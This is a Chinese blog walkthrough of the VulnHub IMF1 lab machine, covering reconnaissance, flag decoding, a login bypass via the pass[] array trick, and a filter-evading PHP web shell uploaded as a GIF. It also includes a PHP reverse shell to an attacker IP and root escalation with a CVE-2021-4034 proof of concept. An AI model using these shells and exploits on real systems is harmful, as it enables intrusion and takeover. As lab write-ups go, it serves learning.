@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            vulnhub-IMF1 |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">vulnhub-IMF1</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-08-08 09:34:47</span>
+        <span class="mobile">2022-08-08 09:34</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>804 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP 192.168.2.0/24</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org )</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.159</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)</span><br><span class="line">Nmap scan report for 192.168.2.165</span><br><span class="line">Host is up (0.090s latency).</span><br><span class="line">MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.2.165            </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) </span><br><span class="line">Nmap scan report for 192.168.2.165</span><br><span class="line">Host is up (0.0079s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 114.97 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.2.165/ -x 403</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812095618204.png" alt="image-20220812095618204"></p>
+<p>​	目录扫完，啥有用的信息都没获取到，这时只能在网站上面翻翻网页源码，看看有没有什么有用信息。</p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812095826149.png" alt="image-20220812095826149"></p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://192.168.2.165/contact.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- flag1&#123;YWxsdGhlZmlsZXM=&#125; --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812095521433.png" alt="image-20220812095521433"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;YWxsdGhlZmlsZXM=&quot; | base64 --decode</span><br><span class="line">allthefiles  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812100015659.png" alt="image-20220812100015659"></p>
+<p>​	这个参数暂时不知道怎么利用。</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>​	拿到flag1后，没有什么往后走的有用信息，又仔细看了一下网页源码，发现有几个js文件名称比较怪，像是base64，通过组合解码得到flag2，并得到了一个路径：</p>
+<p><code>imfadministrator</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&quot; | base64 --decode</span><br><span class="line">flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;                                                                                                                            </span><br><span class="line"></span><br><span class="line">echo &quot;aW1mYWRtaW5pc3RyYXRvcg==&quot; | base64 --decode</span><br><span class="line">imfadministrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812095332045.png" alt="image-20220812095332045"></p>
+<h2 id="x2F-imfadministrator"><a href="#x2F-imfadministrator" class="headerlink" title="&#x2F;imfadministrator"></a>&#x2F;imfadministrator</h2><p><img src="/2022/08/08/vulnhub-IMF1/image-20220812100943378.png" alt="image-20220812100943378"></p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812100916756.png" alt="image-20220812100916756"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h2><p>​	随意输入用户密码登录，显示<code>无效用户名</code>，尝试<code>contact.php</code>中的用户名，结果返回<code>无效密码</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rmichaels</span><br><span class="line">akeith</span><br><span class="line">estone</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812101707509.png" alt="image-20220812101707509"></p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812101807677.png" alt="image-20220812101807677"></p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812103124312.png" alt="image-20220812103124312"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.2.165/contact.php -w pwd.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="登录验证绕过"><a href="#登录验证绕过" class="headerlink" title="登录验证绕过"></a>登录验证绕过</h2><p>​	strcmp判断两个字符是否相等时，如果两个字符串相等，返回结果为0，但如果是字符串和数字进行比较，也会返回0。</p>
+<p>​	提示里面说的意思这里没有通过数据库查看密码，而是直接写在代码里进行对比，</p>
+<p>​	所以这里将密码字段<code>pass</code>改为<code>pass[]</code>，直接绕过登录验证。</p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220815172237007.png" alt="image-20220815172237007"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3&#123;Y29udGludWVUT2Ntcw==&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="上传白名单"><a href="#上传白名单" class="headerlink" title="上传白名单"></a>上传白名单</h3><p>​	经测试，这里是白名单，后缀必须是<code>png、jpg、gif</code>，上传gif显示乱码，怀疑这里gif会被作为php脚本解析，然后上传phpinfo测试。</p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812143317432.png" alt="image-20220812143317432"></p>
+<h3 id="gif被解析"><a href="#gif被解析" class="headerlink" title="gif被解析"></a>gif被解析</h3><p>​	结果gif确实被解析了。</p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812143628971.png" alt="image-20220812143628971"></p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812143657431.png" alt="image-20220812143657431"></p>
+<h3 id="限制函数绕过"><a href="#限制函数绕过" class="headerlink" title="限制函数绕过"></a>限制函数绕过</h3><p>​	本来想直接用蚁剑生成的一句话，但是显示禁用了Base64 decode函数，后续尝试了多种一句话，在黑盒测试的情况下，总结了回显里面的禁用。	</p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812142728655.png" alt="image-20220812142728655"></p>
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812142757835.png" alt="image-20220812142757835"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.文件后缀必须是 png、jpg、gif</span><br><span class="line">2.content-type必须与上述匹配</span><br><span class="line">3.文件内容检查：</span><br><span class="line">	文件头必须为白名单的文件头</span><br><span class="line">	不能涉及base64_decode</span><br><span class="line">	不能使用eval等常用函数</span><br></pre></td></tr></table></figure>
+
+<p>​	最后一条，虽然上传代码执行函数assert不回拦截，但是用不了，最后使用下面的一句话，蚁剑成功连接。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br><span class="line"><span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<code>https://www.cnblogs.com/xiaozi/p/7834367.html</code></p>
+<img src="/2022/08/08/vulnhub-IMF1/image-20220812141909913.png" alt="image-20220812141909913" style="zoom:33%;">
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812141945152.png" alt="image-20220812141945152"></p>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p><img src="/2022/08/08/vulnhub-IMF1/image-20220812145120349.png" alt="image-20220812145120349"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag5&#123;YWdlbnRzZXJ2aWNlcw==&#125;</span><br><span class="line">agentservices</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>​		目标机器没有python环境，用php执行反弹shell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.2.162&quot;</span>,<span class="number">2233</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc cve-2021-4034-poc.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812151537851.png" alt="image-20220812151537851"></p>
+<h2 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat Flag.txt</span><br><span class="line">flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;</span><br><span class="line">Gh0stProt0c0ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/08/vulnhub-IMF1/image-20220812151647186.png" alt="image-20220812151647186"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/09/vulnhub-troll2/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-troll2...</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/07/vulnhub-deRPnStiNK1/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-deRPnStiNK1</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.3.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag1"><span class="nav-number">2.4.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag2"><span class="nav-number">2.5.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x2F-imfadministrator"><span class="nav-number">2.6.</span> <span class="nav-text">&#x2F;imfadministrator</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.1.</span> <span class="nav-text">用户枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.</span> <span class="nav-text">登录验证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3"><span class="nav-number">3.2.1.</span> <span class="nav-text">flag3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">3.3.1.</span> <span class="nav-text">上传白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gif%E8%A2%AB%E8%A7%A3%E6%9E%90"><span class="nav-number">3.3.2.</span> <span class="nav-text">gif被解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.3.</span> <span class="nav-text">限制函数绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag5"><span class="nav-number">3.4.</span> <span class="nav-text">flag5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-4034"><span class="nav-number">4.1.</span> <span class="nav-text">CVE-2021-4034</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag6"><span class="nav-number">4.2.</span> <span class="nav-text">flag6</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
